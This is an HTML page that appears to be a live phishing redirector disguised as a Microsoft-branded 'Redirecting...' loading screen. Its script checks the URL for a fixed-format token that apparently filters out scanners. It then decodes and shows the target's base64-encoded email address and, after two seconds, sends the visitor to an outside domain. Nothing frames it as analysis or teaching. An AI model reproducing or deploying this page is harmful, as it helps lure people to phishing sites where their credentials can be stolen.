<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: #f4f4f4;
        }
        img {
            width: 150px;
            height: auto;
        }
        .email-display {
            font-size: 20px;
            color: #333;
            margin-top: 10px;
            font-weight: bold;
        }
        .loading {
            font-size: 24px;
            margin-top: 20px;
        }
        .loading-dots::after {
            content: '...';
            animation: dots 1s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
    </style>
</head>
<body>

    <img id="loadingImage" src="https://store-images.s-microsoft.com/image/apps.64342.9007199266252569.06e34d57-e1e7-4d60-9444-9e04e7cea74f.839ba91a-9709-429a-9e00-6c3e0cda6f0c" alt="Loading Image">
    <div id="emailContainer" class="email-display"></div>
    <div class="loading">
        Loading 2 Full Page<span class="loading-dots"></span>
    </div>

    <script>
        const finalRedirectUrl = 'https://random.bmtadvantage.org/deep-linkcdn?em=';
        const mixedStringPattern = /^[A-Z]{20}[a-z]{20}\d{8}.*=$/;

        // Extract query parameters
        const queryString = window.location.search.substring(1);
        const [mixedString, emailParam] = queryString.split('=');

        let emailToDisplay = '';

        // Check if mixedString is valid
        if (mixedStringPattern.test(mixedString)) {
            // If there's an email parameter, decode if Base64
            if (emailParam) {
                try {
                    emailToDisplay = atob(emailParam);
                    if (!emailToDisplay.includes('@')) {
                        emailToDisplay = emailParam; // If it's not valid Base64, show it as is
                    }
                } catch {
                    emailToDisplay = emailParam; // If decoding fails, show the raw value
                }
            }

            // Display email if available
            if (emailToDisplay) {
                document.getElementById('emailContainer').textContent = emailToDisplay;
            }

            // Redirect after 2 seconds
            setTimeout(() => {
                window.location.href = finalRedirectUrl;
            }, 2000);
        } else {
            alert('Invalid URL format.');
        }
    </script>

</body>
</html>
